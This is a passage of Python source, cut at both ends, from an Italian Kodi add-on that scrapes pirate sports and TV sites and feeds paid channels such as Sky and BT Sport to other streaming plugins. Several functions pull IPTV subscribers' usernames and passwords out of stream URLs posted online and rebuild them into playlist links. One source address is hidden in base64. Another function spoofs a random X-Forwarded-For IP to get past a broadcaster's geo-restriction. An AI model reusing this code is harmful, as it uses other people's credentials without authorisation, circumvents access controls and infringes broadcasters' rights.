    'Accept-Language':'it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4',\
    }
    data1 = requests.get(url, headers=headers, verify=False).text
    link1 = re.findall(r'(http[^<]+)', data1)[0]
    data2 = requests.get(link1, headers=headers, verify=False).text
    links2 = re.findall(r'BANDWIDTH=(.+?),.+\s*(http.+)', data2)
    links = []
    for i, u in links2:
        i = int(i)/1000
        links.append([int(i),u])
    links = sorted(links, key=itemgetter(0), reverse=True)
    h = '|User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&X-Requested-With=ShockwaveFlash/24.0.0.194&Connection=keep-alive&Accept-Encoding=gzip, deflate, sdch'
    nlinks = []
    ulinks = []
    for nlink, ulink in links:
        nlink = '[COLOR skyblue] BANDWIDTH = [/COLOR][COLOR lime]'+str(nlink)+' Kbits[/COLOR]'
        nlinks.append(str(nlink))
        ulinks.append(ulink)
    select = Getdialogselect('Seleziona il flusso - by FULVIO',nlinks)
    xbmc.sleep(150)
    if select == -1:
        pass
    for i in range(len(links)):
        if select == i:
            f4murl = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(ulinks[i]+h)+'&amp;streamtype=HLS&name='+urllib.quote(nlinks[i])+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            xbmc.sleep(350)
            xbmc.executebuiltin('XBMC.RunPlugin('+f4murl+')')

def getCricfree():
    addDir('[B] [COLOR yellow]  CricFree - stream  by Fulvio[/COLOR][/B]','cricfree',522,'','','','','','','list')
    h = 'http://cricfree.sc/'
    links = [\
    ['sky-sport-1-in-streaming','Sky Sport 1 ITA'],\
    ['sky-sport-2-in-streaming','Sky Sport 2 ITA'],\
    ['sky-calcio-in-diretta-','Sky Calcio ITA'],\
    ['sky-calcio-1-live-streaming','Sky Calcio 1 ITA'],\
    ['sky-calcio-2-live-streaming','Sky Calcio 2 ITA'],\
    ['sky-calcio-3-live-streaming','Sky Calcio 3 ITA'],\
    ['sky-sports-1-live-stream-ss-1','Sky Sport 1 '],\
    ['sky-sports-2-live-stream-','Sky Sport 2'],\
    ['sky-sports-3-live-stream-3','Sky Sport 3'],\
    ['sky-sports-4-live-streaming','Sky Sport 4'],\
    ['sky-sports-5-live-stream-5','Sky Sport 5'],\
    ['fox-sports-1-usa-live-stream','Fox Sport 1'],\
    ['fox-sports-2-usa-live-stream','Fox Sport 2'],\
    ['sky-sports-news-live-stream-','Sky Sport News'],\
    ['sky-sports-f1-live-stream-','Sky Sport F1'],\
    ['bt-sport-1-live-stream-ing','BT Sport 1'],\
    ['bt-sport-2-live-stream-2','BT Sport 2'],\
    ['espn-live-stream-btsports','BT Sport ESPN'],\
    ['bt-sport-europe-live-stream-free','BT Sport Europe'],\
    ['euro-sports-1-live-stream','Eurosport 1'],\
    ['euro-sports-2-live-stream','Eurosport 2'],\
    ['bein-sports-1-fr-live-stream','beIN Sport 1 Fr'],\
    ['nba-network-live-stream','NBA TV'],\
    ['bbc-1-live-stream','BBC One 1'],\
    ['bbc-two-live-stream','BBC Two 2'],\
    ]
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(links)
    c = 0
    for url, name in links:
        c += 1
        sp = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url='+h+url+'%26referer%3d'+h+'%26videoTitle%3d'+urllib.quote_plus(name)+'%26icon%3d'+urllib.quote_plus(thumbnail)
        addLink(sp,'[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def getCloudtv():
    addDir('[B] [COLOR yellow]  Cloud TV stream  by Fulvio[/COLOR][/B]','cricfree',523,'','','','','','','list')
    home = 'http://www.cloud-tivu.net/ConsoleTv/ElencoCanali%202.0.php'
    data = makeRequest(home)
    pages = re.findall(r'href="(http://www.cloud-tivu.net/Blog/[^"]+)".+?title="(.+?)"', data)
    total = len(pages)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for url, name in pages:
        c += 1
        sp = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url='+url+'%26referer%3d'+home+'%26videoTitle%3d'+urllib.quote_plus(name)+'%26icon%3d'+urllib.quote_plus(thumbnail)
        addLink(sp,'[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def getKoratv():
    addDir('[B] [COLOR yellow]  Kora TV   by Fulvio[/COLOR][/B]','koratv',524,'','','','','','','list')
    home = 'http://kora-live.tv/'
    data = makeRequest(home)
    pages = re.findall(r'<a href="([^"]+)\.html" target="_parent"><img src="([^"]+)"', data)
    total = len(pages)
    c = 0
    for name, icon in pages:
        if name != 'index':
            c += 1
            url = home+name+'.html'
            thumbnail = home+icon
            sp = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url='+url+'%26referer%3d'+home+'%26videoTitle%3d'+urllib.quote_plus(name)+'%26icon%3d'+urllib.quote_plus(thumbnail)
            addLink(sp,'[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def getHdlive(u='http://skypremiumlivehd.tk'):
    r = requests.head(u, allow_redirects=True, timeout=15)
    home = r.url
    addDir('[B] [COLOR yellow]  HD Live   by Fulvio[/COLOR][/B]','hdlive',525,'','','','','','','list')
    data = makeRequest(home)
    pages = re.findall(r'<a href="([^"]+)">(.+?)</a>', data)
    for url, name in pages:
        url = home+'/'+url
        addDir('[B]   [COLOR cyan]'+name+'[/COLOR][/B]',url,526,'','','','','','','list')

def getHdlive2(url):
    data = makeRequest(url)
    pages = re.findall(r'href="(index\.php\?page=.+?)">\s+.+?title="(.+?)"', data)
    total = len(pages)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for u, n in pages:
        if u != 'index.php?page=home':
            c += 1
            if not url.endswith('/'):
                url2=url+'/'+u
            else:
                url2=url+u
            addDir('[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+n+'[/COLOR] [/B]',url2.encode('utf-8'),527,thumbnail,'','','','','','list')

def getHdlive3(url):
    html = makeRequest(url)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    link = re.findall(r'<source type="application/x-mpegurl"\s+src="([^"]+)">',html)[0]

    if re.search(r'playlists/', link):
        resub1 = url.split("/")[-1]
        home = url.replace(resub1,link)
        data = makeRequest(home)
        links = re.findall(r'(RESOLUTION=.+?)\s(http.+)',data)
        total = len(links)
        for nlink, ilink in links:
            addLink(ilink,name+' '+nlink,thumbnail,'','','','',True,None,'',total)
    else:
        addLink(link,name,thumbnail,'','','','',True,None,'',1)

def getAndroidtv():
    addDir('[B] [COLOR yellow]  Android TV  by Fulvio[/COLOR][/B]','androidtv',528,os.path.join(home, 'icon.png'),FANART,'','','','','list')
    addDir('[B]   [COLOR cyan]CANALI TV[/COLOR][/B]','http://www.appleandroidtv.com/canalitv/',571,'','','','','','','list')
    addDir('[B]   [COLOR cyan]SPORT HD[/COLOR][/B]','http://www.appleandroidtv.com/canali-sport-calcio-hd/',571,'','','','','','','list')
    addDir('[B]   [COLOR cyan]Liste M3U[/COLOR][/B]','http://www.appleandroidtv.com/liste-m3u/',554,'','','','','','','list')

def getAndroidtv2(url):
    matches = set()
    out = set()
    c = makeRequest(url)
    match = re.findall("http://(.+?)/(?:live|movie)/(.+?)/(.+?)/.+?\.(?:ts|m3u8|mkv|mp4|avi)", c)
    for i1,i2,i3 in match:
        list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
        out.add(list)
    return out
    # data = makeRequest(url)
    # links = re.findall(r'http:\/\/(.+?)\/live\/(.+?)\/(.+?)\/.+?\.m3u8', data)
    # out = set()
    # for i1, i2, i3 in links:
        # list = 'http://'+i1+'/get.php?username='+i2+'&password='+i3+'&type=m3u'
        # out.add(list)
    # thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    # c = 0
    # for i in out:
        # c += 1
        # matches = re.finditer(r'http://(.{6}).+?/get\.php\?username=(.{1,3}).+?&password=.+?&type=m3u', i)
        # for m in matches:
            # r1 = m.group(1)
            # r2 = m.group(2)
        # n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
        # addDir(n,i,1,thumbnail,'','','','','','list')

def getEritrolist():
    addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [COLOR yellow]   by Fulvio[/COLOR][/B]','url',533,'','','','','','','list')
    h = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvZXJpdHJvLnBocA==')
    # c = makeRequest(h)
    # m = re.findall(base64.decodestring('aHR0cDovLy4rPy8uKz91c2VybmFtZT0uKz8mcGFzc3dvcmQ9Lis/JnR5cGU9bTN1'), c)
    m = Erilis()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for i in m:
        c += 1
        matches = re.finditer(r'http://(.{5}).+?/get\.php\?username=(.{1,3}).+?&password=.+?&type=m3u', i)
        for r in matches:
            r1 = r.group(1)
            r2 = r.group(2)
        n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
        addDir(n,i,1,thumbnail,'','','','','','list')

def searchEritrolist():
    from itertools import islice
    quante = int(numeric('Fulvio LIVE: Numero di liste in cui cercare', ''))
    start = int(numeric('Fulvio LIVE: Posizione da cui partire la ricerca', ''))
    limit = quante + start

    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')
    # h = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvZXJpdHJvLnBocA==')
    # c = makeRequest(h)
    # match = re.findall(base64.decodestring('aHR0cDovLy4rPy8uKz91c2VybmFtZT0uKz8mcGFzc3dvcmQ9Lis/JnR5cGU9bTN1'), c)
    match = Erilis()
    count = 0
    for item in islice(match, start, limit):
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for list in islice(match, start, limit):
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
        url1 = list
        try:
            html1 = makeRequest(url1)
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for i1, name, url, i4, i5 in matches:
        c += 1
        addLink(url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def getStreamhunt(h):
    from xml.sax.saxutils import escape, unescape
    addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [COLOR yellow]   by Fulvio[/COLOR][/B]','url',535,'','','','','','','list')
    c = makeRequest(h)
    m = re.findall(r'(http:\/\/.+?\/get\.php\?username=.+?&.*?password=.+?&.*?type=m3u)', c)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for i in m:
        i = unescape(i)
        c += 1
        matches = re.finditer(r'http://(.{6}).+?/get\.php\?username=(.{1,3}).+?&password=.+?&type=m3u', i)
        for r in matches:
            r1 = r.group(1)
            r2 = r.group(2)
        n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
        addDir(n,i,1,thumbnail,'','','','','','list')

def searchStreamhunt():
    from itertools import islice
    quante = int(numeric('Fulvio LIVE: Numero di liste in cui cercare', ''))
    start = int(numeric('Fulvio LIVE: Posizione da cui partire la ricerca', ''))
    limit = quante + start

    from xml.sax.saxutils import escape, unescape
    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')
    h = 'http://www.m3uliste.pw/'
    c = makeRequest(h)
    match = re.findall(r'(http:\/\/.+?\/get\.php\?username=.+?&.*?password=.+?&.*?type=m3u)', c)
    count = 0
    for item in islice(match, start, limit):
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for list in islice(match, start, limit):
        list = unescape(list)
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
        url1 = list
        try:
            html1 = makeRequest(url1)
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for i1, name, url, i4, i5 in matches:
        c += 1
        addLink(url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def List1(url):
    from operator import itemgetter
    h = makeRequest('http://pastebin.com/raw/sLU4cGUg')
    c = re.search(r'(http.+type=m3u)', h).group(1)
    d = makeRequest(c)

    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    h = makeRequest('http://pastebin.com/raw/yK6gbK41')
    ua = re.search(r'(\S+)', h).group(1)

    m1 = re.compile(r'#EXTINF:.+?,(it[^a-zA-Z0-9].+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(d)
    m1 = sorted(m1, key=itemgetter(0))
    total = 0
    total += len(m1)
    for i, u in m1:
        u = u+'|User-Agent='+ua
        addLink(u, '[B][COLOR skyblue]'+i+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

    m2 = re.compile(r'#EXTINF:.+?,((?!it[^a-zA-Z0-9]).+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(d)
    m2 = sorted(m2, key=itemgetter(0))
    total += len(m2)
    for i, u in m2:
        u = u+'|User-Agent='+ua
        addLink(u, '[B][COLOR skyblue]'+i+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def getOpus(h):
    from operator import itemgetter
    hdr = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0','Referer':h,'Accept-Encoding':'gzip, deflate','Accept-Language':'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    d = requests.get(h+'/index-PLAYLIST.php', headers=hdr, verify=False).text
    m = re.compile(r'php\?u=(http://opus\.[^/]+/\S+?)&name=([^\'\"]+).+?<img src="([^"]+)"', re.I).findall(d)
    list=['rai 1','rai 2','rai 3','rete 4','canale 5','italia 1','la 7','rsila 1','rsila 2','rai news','raisport1','raisport2','rai gulp']
    addLink('', '[B][COLOR yellow]ITALIAN[/COLOR][/B]','','','','','',True,None,'',1)
    for ch in list:
        for i1 in m:
            u = i1[0]
            n = i1[1]
            i = i1[2]
            if re.compile(ch, re.I).search(n):
                if not i.startswith('http'):
                    i = h + i
                addDir('[B][COLOR skyblue]'+n+'[/COLOR][/B]',u,541,i,FANART,'','','','','list')
    addLink('', '[B][COLOR yellow]OTHERS[/COLOR][/B]','','','','','',True,None,'',1)
    for i1 in sorted(m, key=itemgetter(1)):
        u = i1[0]
        n = i1[1]
        i = i1[2]
        if not any(re.compile(x, re.I).search(n) for x in list):
            if not i.startswith('http'):
                i = h + i
            addDir('[B][COLOR skyblue]'+n+'[/COLOR][/B]',u,541,i,FANART,'','','','','list')
    # for u,n,i in m:
        # if not i.startswith('http'):
            # i = h + i
        # addDir('[B][COLOR skyblue]'+n+'[/COLOR][/B]',u,541,i,FANART,'','','','','list')

def getOpus2(u):
    from operator import itemgetter
    hdr = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0','Referer':'http://p.jwpcdn.com/6/12/jwplayer.flash.swf','Accept-Encoding':'gzip, deflate'}
    data = requests.get(u, headers=hdr, verify=False).text
    links1 = re.findall(r'BANDWIDTH=(.+)\s(http.+)', data)
    links = []
    for i, u in links1:
        i = int(i)/1000
        links.append([int(i),u])
    links = sorted(links, key=itemgetter(0), reverse=True)
    nlinks = []
    ulinks = []
    for nlink, ulink in links:
        nlink = '[COLOR skyblue] BANDWIDTH = [/COLOR][COLOR lime]'+str(nlink)+' Kbits[/COLOR]'
        nlinks.append(str(nlink))
        ulinks.append(ulink)
    select = Getdialogselect('Seleziona il flusso - by FULVIO',nlinks)
    xbmc.sleep(150)
    if select == -1:
        pass
    for i in range(len(links)):
        if select == i:
            f4murl = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(ulinks[i])+'&amp;streamtype=HLS&name='+urllib.quote(nlinks[i])+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            xbmc.sleep(350)
            xbmc.executebuiltin('XBMC.RunPlugin('+f4murl+')')

def getRsich():
    addDir('[B] [COLOR yellow]  RSI  channels[/COLOR][/B]','url',557,'','','','','','','list')
    links = [\
    ['RSI LA 1','12:enc12uni_ch@191527'],\
    ['RSI LA 2','13:enc13uni_ch@191855'],\
    ]
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(links)
    c = 0
    for name, code in links:
        c += 1
        pid = code.split(":")[0]
        cid = code.split(":")[1]
        url = "http://tp.srgssr.ch/akahd/token?acl=/i/" + cid +"/*"
        from random import randint
        a = str(randint(0,8))
        b = str(randint(0,256))
        cc = str(randint(0,256))
        ip = "85."+a+'.'+b+'.'+cc
        data = requests.get(url, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko'}, verify=False).text 
        token = re.search('authparams":"(.*?)"',data).group(1)
        u = 'https://srgssruni' + pid +'ch-lh.akamaihd.net/i/' + cid + '/master.m3u8?' + token + '|X-Forwarded-For='+ip
        addLink( u, '[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def getDreamworld():
    addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [COLOR yellow]   by Fulvio[/COLOR][/B]','url',543,'','','','','','','list')
    m = Dreamlis()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for i in m:
        c += 1
        matches = re.finditer(r'http://(.{5}).+?/get\.php\?username=(.{1,3}).+?&password=.+?&type=m3u', i)
        for r in matches:
            r1 = r.group(1)
            r2 = r.group(2)
        n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
        addDir(n,i,1,thumbnail,'','','','','','list')

def searchDreamworld():
    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')
    match = Dreamlis()
    count = 0
    for item in match:
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for list in match:
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - [/COLOR]' )
        url1 = list
        try:
            html1 = makeRequest(url1)
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for i1, name, url, i4, i5 in matches:
        c += 1
        addLink(url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def iptvBinindex():
    iptvBinmain('http://www.iptvbin.com/search?max-results=40')

def iptvBinmain(url):
    addDir('[B] [COLOR yellow]  IPTV BIN by Fulvio[/COLOR][/B]','url',544,'','','','','','','list')
    html = makeRequest(url)
    blogpage = re.compile(r'<a href=\'(http://www.iptvbin.com/[^\']+)\'>[^"]+"(http[^"]+)","([^"]+)"', re.DOTALL | re.IGNORECASE).findall(html)
    c = 0
    for url, img, name in blogpage:
        c += 1
        addDir('[B][COLOR white]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR][/B]',url,546,img,'','','','','','list')
    # try:
        # nextp = re.compile("'blog-pager-older-link' href='([^']+)'", re.DOTALL | re.IGNORECASE).findall(html)[0]
        # nextp = nextp.replace('&amp;','&')
        # addDir('Next Page', nextp, 0, uiptvicon)
        # addDir('[B] [COLOR yellow]Next Page[/COLOR][/B]',nextp,510,'','','','','','','list')
    # except: pass

def iptvBinpage(url):
    from xml.sax.saxutils import escape, unescape
    html = makeRequest(url)
    playlists = re.compile(r'<b>([^<]+)</b><br />\s*(http[^<]+)<', re.DOTALL | re.IGNORECASE).findall(html)
    c = 0
    for name, url in playlists:
        c += 1
        addDir('[B][COLOR white]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR][/B]',unescape(url),547,'','','','','','','list')

def getWizhd(url='http://wizhdsports.is/'):
    addDir('[B] [COLOR yellow]  WizHdSports by Fulvio[/COLOR][/B]','url',548,'','','','','','','list')
    html = makeRequest(url)
    matches = re.compile(r'<span class=\'fa fa-clock-o\'><\/span>([^<]+)<\/div>[^<]+<div[^>]+>([^<]+)<\/div>[^<]+<div[^>]+>([^<]+)<\/div>.+?<div class="card-block drop_box">(.+?)<\/div>\s', re.DOTALL).findall(html)
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for time, name, type, links in matches:
        name=name.replace('\t','')
        matches1 = re.compile(r'<a href=\'([^\']+)\'><div[^>]+>([^<]+)<', re.DOTALL).findall(links)
        url = ''
        for ulink, nlink in matches1:
            url1 = '<a>'+ulink+'<a><b>'+nlink+'<b>'
            url = url + url1
        addDir('[COLOR white]UTC '+time+'[/COLOR] [COLOR yellow]'+type+'[/COLOR] [COLOR cyan]'+name+'[/COLOR]',url,549,img,'','','','','','list')

def getWizhd2(url):
    # xbmc.log('URL passato: '+url)
    home = 'http://wizhdsports.is/'
    matches = re.compile(r'<a>(.+?)<a><b>(.+?)<b>', re.DOTALL).findall(url)
    total = len(matches)
    c = 0
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    links = []
    names = []
    for link, name in matches:
        c += 1
        links.append(link)
        name = '[COLOR yellow] '+str(c)+' [/COLOR] | [COLOR lime]'+str(name)+'[/COLOR]'
        names.append(name)
    
    select = Getdialogselect('Seleziona il flusso - by FULVIO',names)
    xbmc.sleep(150)
    if select == -1:
        pass
    for i in range(len(matches)):
        if select == i:
            sp = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url='+links[i]+'%26referer%3d'+home+'%26videoTitle%3d'+urllib.quote_plus(names[i])+'%26icon%3d'+urllib.quote_plus(thumbnail)               
            xbmc.sleep(350)
            xbmc.executebuiltin('XBMC.RunPlugin('+sp+')')

def getPlaylistitaplexus(home='http://freelive365.com/'):
    addDir('[B] [COLOR yellow]  Playlist ITA (Plexus)  by Fulvio[/COLOR][/B]','url',550,'','','','','','','list')
    # links = [\
    # ['267b9aa44db013be6d3ed6257cb639a037743e95','null'],\
    # ]
    html = makeRequest(home+'live_info.php?id=5')
    matches = re.compile(r'<li><a href=\'([^\']+IT)\' class="titulo" target=_blank><table width=100%><tr><td width=70%>([^<]+)</td><td width=30%><img src="([^"]+)"').findall(html)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for url, name, img in matches:
        c += 1
        addDir('[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',home+url,562,img,'','','','','','list')
        # sp = 'plugin://program.plexus/?url='+urllib.quote_plus(url)+'&mode=1&name='+urllib.quote_plus(name)+'&iconimage='+urllib.quote_plus(thumbnail)
        # xbmc.log('URL plexus sp: '+sp)
        # addLink( sp, '[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def getPlaylistitaplexus2(url, name):
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    html = makeRequest(url)
    ace = re.compile(r'<iframe\s*src="http:\/\/torrentstream\.org\/embed\/([^"]+)"').findall(html)[0]
    sp = 'plugin://program.plexus/?url='+urllib.quote_plus(ace)+'&mode=1&name='+urllib.quote_plus(name)+'&iconimage='+urllib.quote_plus(thumbnail)
    xbmc.sleep(150)
    xbmc.executebuiltin('XBMC.RunPlugin('+sp+')')

def getArenavision(u='http://acesoplisting.in/'):
    addDir('[B] [COLOR yellow]  Arenavision by Fulvio[/COLOR][/B]','url',552,'','','','','','','list')
    headers = [
        ['User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'],
        ['Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'],
        ['Accept-Encoding', 'gzip, deflate'],
        ['Accept-Language', 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3'],
        ['Connection', 'keep-alive']
    ]

    html = makeRequest(u, headers)
    matches = re.compile(r'<td class="text-right">\s*(\d\d:\d\d)\s*</td>.+?<td>\s*(\w+)\s*</td>.+?<td colspan="2">\s*(.+?)\s{3,100}</td>.+?<td class="xsmall text-muted">\s*(.+?)\s{3,100}</td>.+?<td class="align-middle">(.+?)</a>\s*</td>\s*</tr>', re.DOTALL).findall(html)
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    matches2 = re.compile(r'<tr class="info">\s*<th colspan="3">\s*<h4>\s*(\w.+?\d)\s*</h4>\s*<\/th>\s*<th>', re.DOTALL).findall(html)
    n = 1
    addDir('  [COLOR hotpink]'+matches2[0]+'[/COLOR] ','',553,img,'','','','','','list')
    lasthh = 0
    c = 0
    for time, sport, event, compet, links in matches:
        hh = str(int(time.split(':')[0])+2)
        mm = ':'+time.split(':')[1]
        event = event.replace('\t','').replace('\r','').replace('\n','')
        compet = compet.replace('\t','').replace('\r','').replace('\n','')
        matches1 = re.compile(r'href="acestream:\/\/([^"]+)".+?(Channel \d+)<br />Language (\w+)', re.DOTALL).findall(links)
        url = ''
        for ulink, nlink, lang in matches1:
            url1 = '<a>'+ulink+'<a><b>'+nlink+'<b><c>'+lang+'<c>'
            url = url + url1
        if int(hh) < lasthh:
